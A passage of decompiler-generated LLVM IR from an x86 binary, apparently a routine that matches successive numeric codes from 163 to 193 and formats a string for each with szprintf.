  %v0_804c1b6 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c1b6 = zext i8 %v0_804c1b6 to i32
  store i32 %v1_804c1b6, i32* @edx, align 4
  %v0_804c1c0 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c1c0 = zext i8 %v0_804c1c0 to i32
  %v2_804c1cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1cf, i32* @ebx, align 4
  %v4_804c1e1 = call i32 @szprintf(i32 %v2_804c1cf, i32 ptrtoint ([14 x i8]* @global_var_8058c5e.194 to i32), i32 %v1_804c1c0)
  br label %dec_label_pc_804c1e6

dec_label_pc_804c1e6:                             ; preds = %dec_label_pc_804c1ad, %dec_label_pc_804c1b6
  %v13_804c1e6 = icmp eq i32 %v2_8049efa, 163
  %v1_804c1ed = icmp eq i1 %v13_804c1e6, false
  br i1 %v1_804c1ed, label %dec_label_pc_804c21f, label %dec_label_pc_804c1ef

dec_label_pc_804c1ef:                             ; preds = %dec_label_pc_804c1e6
  %v0_804c1ef = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c1ef = zext i8 %v0_804c1ef to i32
  store i32 %v1_804c1ef, i32* @edx, align 4
  %v0_804c1f9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c1f9 = zext i8 %v0_804c1f9 to i32
  %v2_804c208 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c208, i32* @ebx, align 4
  %v4_804c21a = call i32 @szprintf(i32 %v2_804c208, i32 ptrtoint ([14 x i8]* @global_var_8058c6c.195 to i32), i32 %v1_804c1f9)
  br label %dec_label_pc_804c21f

dec_label_pc_804c21f:                             ; preds = %dec_label_pc_804c1e6, %dec_label_pc_804c1ef
  %v13_804c21f = icmp eq i32 %v2_8049efa, 164
  %v1_804c226 = icmp eq i1 %v13_804c21f, false
  br i1 %v1_804c226, label %dec_label_pc_804c258, label %dec_label_pc_804c228

dec_label_pc_804c228:                             ; preds = %dec_label_pc_804c21f
  %v0_804c228 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c228 = zext i8 %v0_804c228 to i32
  store i32 %v1_804c228, i32* @edx, align 4
  %v0_804c232 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c232 = zext i8 %v0_804c232 to i32
  %v2_804c241 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c241, i32* @ebx, align 4
  %v4_804c253 = call i32 @szprintf(i32 %v2_804c241, i32 ptrtoint ([14 x i8]* @global_var_8058bd9.184 to i32), i32 %v1_804c232)
  br label %dec_label_pc_804c258

dec_label_pc_804c258:                             ; preds = %dec_label_pc_804c21f, %dec_label_pc_804c228
  %v13_804c258 = icmp eq i32 %v2_8049efa, 165
  %v1_804c25f = icmp eq i1 %v13_804c258, false
  br i1 %v1_804c25f, label %dec_label_pc_804c291, label %dec_label_pc_804c261

dec_label_pc_804c261:                             ; preds = %dec_label_pc_804c258
  %v0_804c261 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c261 = zext i8 %v0_804c261 to i32
  store i32 %v1_804c261, i32* @edx, align 4
  %v0_804c26b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c26b = zext i8 %v0_804c26b to i32
  %v2_804c27a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c27a, i32* @ebx, align 4
  %v4_804c28c = call i32 @szprintf(i32 %v2_804c27a, i32 ptrtoint ([14 x i8]* @global_var_8058c7a.196 to i32), i32 %v1_804c26b)
  br label %dec_label_pc_804c291

dec_label_pc_804c291:                             ; preds = %dec_label_pc_804c258, %dec_label_pc_804c261
  %v13_804c291 = icmp eq i32 %v2_8049efa, 166
  %v1_804c298 = icmp eq i1 %v13_804c291, false
  br i1 %v1_804c298, label %dec_label_pc_804c2ca, label %dec_label_pc_804c29a

dec_label_pc_804c29a:                             ; preds = %dec_label_pc_804c291
  %v0_804c29a = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c29a = zext i8 %v0_804c29a to i32
  store i32 %v1_804c29a, i32* @edx, align 4
  %v0_804c2a4 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c2a4 = zext i8 %v0_804c2a4 to i32
  %v2_804c2b3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2b3, i32* @ebx, align 4
  %v4_804c2c5 = call i32 @szprintf(i32 %v2_804c2b3, i32 ptrtoint ([14 x i8]* @global_var_8058c88.197 to i32), i32 %v1_804c2a4)
  br label %dec_label_pc_804c2ca

dec_label_pc_804c2ca:                             ; preds = %dec_label_pc_804c291, %dec_label_pc_804c29a
  %v13_804c2ca = icmp eq i32 %v2_8049efa, 167
  %v1_804c2d1 = icmp eq i1 %v13_804c2ca, false
  br i1 %v1_804c2d1, label %dec_label_pc_804c303, label %dec_label_pc_804c2d3

dec_label_pc_804c2d3:                             ; preds = %dec_label_pc_804c2ca
  %v0_804c2d3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c2d3 = zext i8 %v0_804c2d3 to i32
  store i32 %v1_804c2d3, i32* @edx, align 4
  %v0_804c2dd = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c2dd = zext i8 %v0_804c2dd to i32
  %v2_804c2ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2ec, i32* @ebx, align 4
  %v4_804c2fe = call i32 @szprintf(i32 %v2_804c2ec, i32 ptrtoint ([14 x i8]* @global_var_8058c35.191 to i32), i32 %v1_804c2dd)
  br label %dec_label_pc_804c303

dec_label_pc_804c303:                             ; preds = %dec_label_pc_804c2ca, %dec_label_pc_804c2d3
  %v13_804c303 = icmp eq i32 %v2_8049efa, 168
  %v1_804c30a = icmp eq i1 %v13_804c303, false
  br i1 %v1_804c30a, label %dec_label_pc_804c33c, label %dec_label_pc_804c30c

dec_label_pc_804c30c:                             ; preds = %dec_label_pc_804c303
  %v0_804c30c = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c30c = zext i8 %v0_804c30c to i32
  store i32 %v1_804c30c, i32* @edx, align 4
  %v0_804c316 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c316 = zext i8 %v0_804c316 to i32
  %v2_804c325 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c325, i32* @ebx, align 4
  %v4_804c337 = call i32 @szprintf(i32 %v2_804c325, i32 ptrtoint ([15 x i8]* @global_var_8058c96.198 to i32), i32 %v1_804c316)
  br label %dec_label_pc_804c33c

dec_label_pc_804c33c:                             ; preds = %dec_label_pc_804c303, %dec_label_pc_804c30c
  %v13_804c33c = icmp eq i32 %v2_8049efa, 169
  %v1_804c343 = icmp eq i1 %v13_804c33c, false
  br i1 %v1_804c343, label %dec_label_pc_804c375, label %dec_label_pc_804c345

dec_label_pc_804c345:                             ; preds = %dec_label_pc_804c33c
  %v0_804c345 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c345 = zext i8 %v0_804c345 to i32
  store i32 %v1_804c345, i32* @edx, align 4
  %v0_804c34f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c34f = zext i8 %v0_804c34f to i32
  %v2_804c35e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c35e, i32* @ebx, align 4
  %v4_804c370 = call i32 @szprintf(i32 %v2_804c35e, i32 ptrtoint ([14 x i8]* @global_var_8058ca5.199 to i32), i32 %v1_804c34f)
  br label %dec_label_pc_804c375

dec_label_pc_804c375:                             ; preds = %dec_label_pc_804c33c, %dec_label_pc_804c345
  %v13_804c375 = icmp eq i32 %v2_8049efa, 171
  %v1_804c37c = icmp eq i1 %v13_804c375, false
  br i1 %v1_804c37c, label %dec_label_pc_804c3ae, label %dec_label_pc_804c37e

dec_label_pc_804c37e:                             ; preds = %dec_label_pc_804c375
  %v0_804c37e = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c37e = zext i8 %v0_804c37e to i32
  store i32 %v1_804c37e, i32* @edx, align 4
  %v0_804c388 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c388 = zext i8 %v0_804c388 to i32
  %v2_804c397 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c397, i32* @ebx, align 4
  %v4_804c3a9 = call i32 @szprintf(i32 %v2_804c397, i32 ptrtoint ([14 x i8]* @global_var_8058cb3.200 to i32), i32 %v1_804c388)
  br label %dec_label_pc_804c3ae

dec_label_pc_804c3ae:                             ; preds = %dec_label_pc_804c375, %dec_label_pc_804c37e
  %v13_804c3ae = icmp eq i32 %v2_8049efa, 172
  %v1_804c3b5 = icmp eq i1 %v13_804c3ae, false
  br i1 %v1_804c3b5, label %dec_label_pc_804c3e7, label %dec_label_pc_804c3b7

dec_label_pc_804c3b7:                             ; preds = %dec_label_pc_804c3ae
  %v0_804c3b7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c3b7 = zext i8 %v0_804c3b7 to i32
  store i32 %v1_804c3b7, i32* @edx, align 4
  %v0_804c3c1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c3c1 = zext i8 %v0_804c3c1 to i32
  %v2_804c3d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3d0, i32* @ebx, align 4
  %v4_804c3e2 = call i32 @szprintf(i32 %v2_804c3d0, i32 ptrtoint ([14 x i8]* @global_var_8058cc1.201 to i32), i32 %v1_804c3c1)
  br label %dec_label_pc_804c3e7

dec_label_pc_804c3e7:                             ; preds = %dec_label_pc_804c3ae, %dec_label_pc_804c3b7
  %v13_804c3e7 = icmp eq i32 %v2_8049efa, 173
  %v1_804c3ee = icmp eq i1 %v13_804c3e7, false
  br i1 %v1_804c3ee, label %dec_label_pc_804c420, label %dec_label_pc_804c3f0

dec_label_pc_804c3f0:                             ; preds = %dec_label_pc_804c3e7
  %v0_804c3f0 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c3f0 = zext i8 %v0_804c3f0 to i32
  store i32 %v1_804c3f0, i32* @edx, align 4
  %v0_804c3fa = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c3fa = zext i8 %v0_804c3fa to i32
  %v2_804c409 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c409, i32* @ebx, align 4
  %v4_804c41b = call i32 @szprintf(i32 %v2_804c409, i32 ptrtoint ([14 x i8]* @global_var_8058ccf.202 to i32), i32 %v1_804c3fa)
  br label %dec_label_pc_804c420

dec_label_pc_804c420:                             ; preds = %dec_label_pc_804c3e7, %dec_label_pc_804c3f0
  %v13_804c420 = icmp eq i32 %v2_8049efa, 174
  %v1_804c427 = icmp eq i1 %v13_804c420, false
  br i1 %v1_804c427, label %dec_label_pc_804c459, label %dec_label_pc_804c429

dec_label_pc_804c429:                             ; preds = %dec_label_pc_804c420
  %v0_804c429 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c429 = zext i8 %v0_804c429 to i32
  store i32 %v1_804c429, i32* @edx, align 4
  %v0_804c433 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c433 = zext i8 %v0_804c433 to i32
  %v2_804c442 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c442, i32* @ebx, align 4
  %v4_804c454 = call i32 @szprintf(i32 %v2_804c442, i32 ptrtoint ([13 x i8]* @global_var_8058cdd.203 to i32), i32 %v1_804c433)
  br label %dec_label_pc_804c459

dec_label_pc_804c459:                             ; preds = %dec_label_pc_804c420, %dec_label_pc_804c429
  %v13_804c459 = icmp eq i32 %v2_8049efa, 175
  %v1_804c460 = icmp eq i1 %v13_804c459, false
  br i1 %v1_804c460, label %dec_label_pc_804c492, label %dec_label_pc_804c462

dec_label_pc_804c462:                             ; preds = %dec_label_pc_804c459
  %v0_804c462 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c462 = zext i8 %v0_804c462 to i32
  store i32 %v1_804c462, i32* @edx, align 4
  %v0_804c46c = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c46c = zext i8 %v0_804c46c to i32
  %v2_804c47b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c47b, i32* @ebx, align 4
  %v4_804c48d = call i32 @szprintf(i32 %v2_804c47b, i32 ptrtoint ([14 x i8]* @global_var_8058cea.204 to i32), i32 %v1_804c46c)
  br label %dec_label_pc_804c492

dec_label_pc_804c492:                             ; preds = %dec_label_pc_804c459, %dec_label_pc_804c462
  %v10_804c492 = icmp eq i32 %v2_8049efa, 176
  %v1_804c499 = icmp eq i1 %v10_804c492, false
  br i1 %v1_804c499, label %dec_label_pc_804c4cb, label %dec_label_pc_804c49b

dec_label_pc_804c49b:                             ; preds = %dec_label_pc_804c492
  %v0_804c49b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c49b = zext i8 %v0_804c49b to i32
  store i32 %v1_804c49b, i32* @edx, align 4
  %v0_804c4a5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c4a5 = zext i8 %v0_804c4a5 to i32
  %v2_804c4b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4b4, i32* @ebx, align 4
  %v4_804c4c6 = call i32 @szprintf(i32 %v2_804c4b4, i32 ptrtoint ([14 x i8]* @global_var_8058cf8.205 to i32), i32 %v1_804c4a5)
  br label %dec_label_pc_804c4cb

dec_label_pc_804c4cb:                             ; preds = %dec_label_pc_804c492, %dec_label_pc_804c49b
  %v13_804c4cb = icmp eq i32 %v2_8049efa, 177
  %v1_804c4d2 = icmp eq i1 %v13_804c4cb, false
  br i1 %v1_804c4d2, label %dec_label_pc_804c504, label %dec_label_pc_804c4d4

dec_label_pc_804c4d4:                             ; preds = %dec_label_pc_804c4cb
  %v0_804c4d4 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c4d4 = zext i8 %v0_804c4d4 to i32
  store i32 %v1_804c4d4, i32* @edx, align 4
  %v0_804c4de = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c4de = zext i8 %v0_804c4de to i32
  %v2_804c4ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4ed, i32* @ebx, align 4
  %v4_804c4ff = call i32 @szprintf(i32 %v2_804c4ed, i32 ptrtoint ([14 x i8]* @global_var_8058d06.206 to i32), i32 %v1_804c4de)
  br label %dec_label_pc_804c504

dec_label_pc_804c504:                             ; preds = %dec_label_pc_804c4cb, %dec_label_pc_804c4d4
  %v13_804c504 = icmp eq i32 %v2_8049efa, 178
  %v1_804c50b = icmp eq i1 %v13_804c504, false
  br i1 %v1_804c50b, label %dec_label_pc_804c53d, label %dec_label_pc_804c50d

dec_label_pc_804c50d:                             ; preds = %dec_label_pc_804c504
  %v0_804c50d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c50d = zext i8 %v0_804c50d to i32
  store i32 %v1_804c50d, i32* @edx, align 4
  %v0_804c517 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c517 = zext i8 %v0_804c517 to i32
  %v2_804c526 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c526, i32* @ebx, align 4
  %v4_804c538 = call i32 @szprintf(i32 %v2_804c526, i32 ptrtoint ([13 x i8]* @global_var_8058d14.207 to i32), i32 %v1_804c517)
  br label %dec_label_pc_804c53d

dec_label_pc_804c53d:                             ; preds = %dec_label_pc_804c504, %dec_label_pc_804c50d
  %v13_804c53d = icmp eq i32 %v2_8049efa, 179
  %v1_804c544 = icmp eq i1 %v13_804c53d, false
  br i1 %v1_804c544, label %dec_label_pc_804c576, label %dec_label_pc_804c546

dec_label_pc_804c546:                             ; preds = %dec_label_pc_804c53d
  %v0_804c546 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c546 = zext i8 %v0_804c546 to i32
  store i32 %v1_804c546, i32* @edx, align 4
  %v0_804c550 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c550 = zext i8 %v0_804c550 to i32
  %v2_804c55f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c55f, i32* @ebx, align 4
  %v4_804c571 = call i32 @szprintf(i32 %v2_804c55f, i32 ptrtoint ([13 x i8]* @global_var_8058d21.208 to i32), i32 %v1_804c550)
  br label %dec_label_pc_804c576

dec_label_pc_804c576:                             ; preds = %dec_label_pc_804c53d, %dec_label_pc_804c546
  %v13_804c576 = icmp eq i32 %v2_8049efa, 180
  %v1_804c57d = icmp eq i1 %v13_804c576, false
  br i1 %v1_804c57d, label %dec_label_pc_804c5af, label %dec_label_pc_804c57f

dec_label_pc_804c57f:                             ; preds = %dec_label_pc_804c576
  %v0_804c57f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c57f = zext i8 %v0_804c57f to i32
  store i32 %v1_804c57f, i32* @edx, align 4
  %v0_804c589 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c589 = zext i8 %v0_804c589 to i32
  %v2_804c598 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c598, i32* @ebx, align 4
  %v4_804c5aa = call i32 @szprintf(i32 %v2_804c598, i32 ptrtoint ([13 x i8]* @global_var_8058d2e.209 to i32), i32 %v1_804c589)
  br label %dec_label_pc_804c5af

dec_label_pc_804c5af:                             ; preds = %dec_label_pc_804c576, %dec_label_pc_804c57f
  %v13_804c5af = icmp eq i32 %v2_8049efa, 181
  %v1_804c5b6 = icmp eq i1 %v13_804c5af, false
  br i1 %v1_804c5b6, label %dec_label_pc_804c5e8, label %dec_label_pc_804c5b8

dec_label_pc_804c5b8:                             ; preds = %dec_label_pc_804c5af
  %v0_804c5b8 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c5b8 = zext i8 %v0_804c5b8 to i32
  store i32 %v1_804c5b8, i32* @edx, align 4
  %v0_804c5c2 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c5c2 = zext i8 %v0_804c5c2 to i32
  %v2_804c5d1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5d1, i32* @ebx, align 4
  %v4_804c5e3 = call i32 @szprintf(i32 %v2_804c5d1, i32 ptrtoint ([13 x i8]* @global_var_8058d3b.210 to i32), i32 %v1_804c5c2)
  br label %dec_label_pc_804c5e8

dec_label_pc_804c5e8:                             ; preds = %dec_label_pc_804c5af, %dec_label_pc_804c5b8
  %v13_804c5e8 = icmp eq i32 %v2_8049efa, 182
  %v1_804c5ef = icmp eq i1 %v13_804c5e8, false
  br i1 %v1_804c5ef, label %dec_label_pc_804c621, label %dec_label_pc_804c5f1

dec_label_pc_804c5f1:                             ; preds = %dec_label_pc_804c5e8
  %v0_804c5f1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c5f1 = zext i8 %v0_804c5f1 to i32
  store i32 %v1_804c5f1, i32* @edx, align 4
  %v0_804c5fb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c5fb = zext i8 %v0_804c5fb to i32
  %v2_804c60a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c60a, i32* @ebx, align 4
  %v4_804c61c = call i32 @szprintf(i32 %v2_804c60a, i32 ptrtoint ([13 x i8]* @global_var_8058d48.211 to i32), i32 %v1_804c5fb)
  br label %dec_label_pc_804c621

dec_label_pc_804c621:                             ; preds = %dec_label_pc_804c5e8, %dec_label_pc_804c5f1
  %v13_804c621 = icmp eq i32 %v2_8049efa, 183
  %v1_804c628 = icmp eq i1 %v13_804c621, false
  br i1 %v1_804c628, label %dec_label_pc_804c65a, label %dec_label_pc_804c62a

dec_label_pc_804c62a:                             ; preds = %dec_label_pc_804c621
  %v0_804c62a = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c62a = zext i8 %v0_804c62a to i32
  store i32 %v1_804c62a, i32* @edx, align 4
  %v0_804c634 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c634 = zext i8 %v0_804c634 to i32
  %v2_804c643 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c643, i32* @ebx, align 4
  %v4_804c655 = call i32 @szprintf(i32 %v2_804c643, i32 ptrtoint ([13 x i8]* @global_var_805867b.84 to i32), i32 %v1_804c634)
  br label %dec_label_pc_804c65a

dec_label_pc_804c65a:                             ; preds = %dec_label_pc_804c621, %dec_label_pc_804c62a
  %v13_804c65a = icmp eq i32 %v2_8049efa, 184
  %v1_804c661 = icmp eq i1 %v13_804c65a, false
  br i1 %v1_804c661, label %dec_label_pc_804c693, label %dec_label_pc_804c663

dec_label_pc_804c663:                             ; preds = %dec_label_pc_804c65a
  %v0_804c663 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c663 = zext i8 %v0_804c663 to i32
  store i32 %v1_804c663, i32* @edx, align 4
  %v0_804c66d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c66d = zext i8 %v0_804c66d to i32
  %v2_804c67c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c67c, i32* @ebx, align 4
  %v4_804c68e = call i32 @szprintf(i32 %v2_804c67c, i32 ptrtoint ([13 x i8]* @global_var_8058d55.212 to i32), i32 %v1_804c66d)
  br label %dec_label_pc_804c693

dec_label_pc_804c693:                             ; preds = %dec_label_pc_804c65a, %dec_label_pc_804c663
  %v13_804c693 = icmp eq i32 %v2_8049efa, 185
  %v1_804c69a = icmp eq i1 %v13_804c693, false
  br i1 %v1_804c69a, label %dec_label_pc_804c6cc, label %dec_label_pc_804c69c

dec_label_pc_804c69c:                             ; preds = %dec_label_pc_804c693
  %v0_804c69c = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c69c = zext i8 %v0_804c69c to i32
  store i32 %v1_804c69c, i32* @edx, align 4
  %v0_804c6a6 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c6a6 = zext i8 %v0_804c6a6 to i32
  %v2_804c6b5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6b5, i32* @ebx, align 4
  %v4_804c6c7 = call i32 @szprintf(i32 %v2_804c6b5, i32 ptrtoint ([13 x i8]* @global_var_8058d62.213 to i32), i32 %v1_804c6a6)
  br label %dec_label_pc_804c6cc

dec_label_pc_804c6cc:                             ; preds = %dec_label_pc_804c693, %dec_label_pc_804c69c
  %v13_804c6cc = icmp eq i32 %v2_8049efa, 186
  %v1_804c6d3 = icmp eq i1 %v13_804c6cc, false
  br i1 %v1_804c6d3, label %dec_label_pc_804c705, label %dec_label_pc_804c6d5

dec_label_pc_804c6d5:                             ; preds = %dec_label_pc_804c6cc
  %v0_804c6d5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c6d5 = zext i8 %v0_804c6d5 to i32
  store i32 %v1_804c6d5, i32* @edx, align 4
  %v0_804c6df = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c6df = zext i8 %v0_804c6df to i32
  %v2_804c6ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6ee, i32* @ebx, align 4
  %v4_804c700 = call i32 @szprintf(i32 %v2_804c6ee, i32 ptrtoint ([14 x i8]* @global_var_8058d6f.214 to i32), i32 %v1_804c6df)
  br label %dec_label_pc_804c705

dec_label_pc_804c705:                             ; preds = %dec_label_pc_804c6cc, %dec_label_pc_804c6d5
  %v13_804c705 = icmp eq i32 %v2_8049efa, 187
  %v1_804c70c = icmp eq i1 %v13_804c705, false
  br i1 %v1_804c70c, label %dec_label_pc_804c73e, label %dec_label_pc_804c70e

dec_label_pc_804c70e:                             ; preds = %dec_label_pc_804c705
  %v0_804c70e = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c70e = zext i8 %v0_804c70e to i32
  store i32 %v1_804c70e, i32* @edx, align 4
  %v0_804c718 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c718 = zext i8 %v0_804c718 to i32
  %v2_804c727 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c727, i32* @ebx, align 4
  %v4_804c739 = call i32 @szprintf(i32 %v2_804c727, i32 ptrtoint ([14 x i8]* @global_var_8058d7d.215 to i32), i32 %v1_804c718)
  br label %dec_label_pc_804c73e

dec_label_pc_804c73e:                             ; preds = %dec_label_pc_804c705, %dec_label_pc_804c70e
  %v13_804c73e = icmp eq i32 %v2_8049efa, 188
  %v1_804c745 = icmp eq i1 %v13_804c73e, false
  br i1 %v1_804c745, label %dec_label_pc_804c777, label %dec_label_pc_804c747

dec_label_pc_804c747:                             ; preds = %dec_label_pc_804c73e
  %v0_804c747 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c747 = zext i8 %v0_804c747 to i32
  store i32 %v1_804c747, i32* @edx, align 4
  %v0_804c751 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c751 = zext i8 %v0_804c751 to i32
  %v2_804c760 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c760, i32* @ebx, align 4
  %v4_804c772 = call i32 @szprintf(i32 %v2_804c760, i32 ptrtoint ([14 x i8]* @global_var_8058d7d.215 to i32), i32 %v1_804c751)
  br label %dec_label_pc_804c777

dec_label_pc_804c777:                             ; preds = %dec_label_pc_804c73e, %dec_label_pc_804c747
  %v13_804c777 = icmp eq i32 %v2_8049efa, 189
  %v1_804c77e = icmp eq i1 %v13_804c777, false
  br i1 %v1_804c77e, label %dec_label_pc_804c7b0, label %dec_label_pc_804c780

dec_label_pc_804c780:                             ; preds = %dec_label_pc_804c777
  %v0_804c780 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c780 = zext i8 %v0_804c780 to i32
  store i32 %v1_804c780, i32* @edx, align 4
  %v0_804c78a = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c78a = zext i8 %v0_804c78a to i32
  %v2_804c799 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c799, i32* @ebx, align 4
  %v4_804c7ab = call i32 @szprintf(i32 %v2_804c799, i32 ptrtoint ([14 x i8]* @global_var_8058d8b.216 to i32), i32 %v1_804c78a)
  br label %dec_label_pc_804c7b0

dec_label_pc_804c7b0:                             ; preds = %dec_label_pc_804c777, %dec_label_pc_804c780
  %v13_804c7b0 = icmp eq i32 %v2_8049efa, 190
  %v1_804c7b7 = icmp eq i1 %v13_804c7b0, false
  br i1 %v1_804c7b7, label %dec_label_pc_804c7e9, label %dec_label_pc_804c7b9

dec_label_pc_804c7b9:                             ; preds = %dec_label_pc_804c7b0
  %v0_804c7b9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c7b9 = zext i8 %v0_804c7b9 to i32
  store i32 %v1_804c7b9, i32* @edx, align 4
  %v0_804c7c3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c7c3 = zext i8 %v0_804c7c3 to i32
  %v2_804c7d2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7d2, i32* @ebx, align 4
  %v4_804c7e4 = call i32 @szprintf(i32 %v2_804c7d2, i32 ptrtoint ([14 x i8]* @global_var_8058d99.217 to i32), i32 %v1_804c7c3)
  br label %dec_label_pc_804c7e9

dec_label_pc_804c7e9:                             ; preds = %dec_label_pc_804c7b0, %dec_label_pc_804c7b9
  %v13_804c7e9 = icmp eq i32 %v2_8049efa, 191
  %v1_804c7f0 = icmp eq i1 %v13_804c7e9, false
  br i1 %v1_804c7f0, label %dec_label_pc_804c822, label %dec_label_pc_804c7f2

dec_label_pc_804c7f2:                             ; preds = %dec_label_pc_804c7e9
  %v0_804c7f2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c7f2 = zext i8 %v0_804c7f2 to i32
  store i32 %v1_804c7f2, i32* @edx, align 4
  %v0_804c7fc = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c7fc = zext i8 %v0_804c7fc to i32
  %v2_804c80b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c80b, i32* @ebx, align 4
  %v4_804c81d = call i32 @szprintf(i32 %v2_804c80b, i32 ptrtoint ([14 x i8]* @global_var_8058da7.218 to i32), i32 %v1_804c7fc)
  br label %dec_label_pc_804c822

dec_label_pc_804c822:                             ; preds = %dec_label_pc_804c7e9, %dec_label_pc_804c7f2
  %v10_804c822 = icmp eq i32 %v2_8049efa, 192
  %v1_804c829 = icmp eq i1 %v10_804c822, false
  br i1 %v1_804c829, label %dec_label_pc_804c85b, label %dec_label_pc_804c82b

dec_label_pc_804c82b:                             ; preds = %dec_label_pc_804c822
  %v0_804c82b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c82b = zext i8 %v0_804c82b to i32
  store i32 %v1_804c82b, i32* @edx, align 4
  %v0_804c835 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c835 = zext i8 %v0_804c835 to i32
  %v2_804c844 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c844, i32* @ebx, align 4
  %v4_804c856 = call i32 @szprintf(i32 %v2_804c844, i32 ptrtoint ([13 x i8]* @global_var_8058db5.219 to i32), i32 %v1_804c835)
  br label %dec_label_pc_804c85b

dec_label_pc_804c85b:                             ; preds = %dec_label_pc_804c822, %dec_label_pc_804c82b
  %v13_804c85b = icmp eq i32 %v2_8049efa, 193
  %v1_804c862 = icmp eq i1 %v13_804c85b, false
  br i1 %v1_804c862, label %dec_label_pc_804c894, label %dec_label_pc_804c864

dec_label_pc_804c864:                             ; preds = %dec_label_pc_804c85b
  %v0_804c864 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804c864 = zext i8 %v0_804c864 to i32
  store i32 %v1_804c864, i32* @edx, align 4
  %v0_804c86e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804c86e = zext i8 %v0_804c86e to i32
  %v2_804c87d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c87d, i32* @ebx, align 4
  %v4_804c88f = call i32 @szprintf(i32 %v2_804c87d, i32 ptrtoint ([13 x i8]* @global_var_8058dc2.220 to i32), i32 %v1_804c86e)
  br label %dec_label_pc_804c894

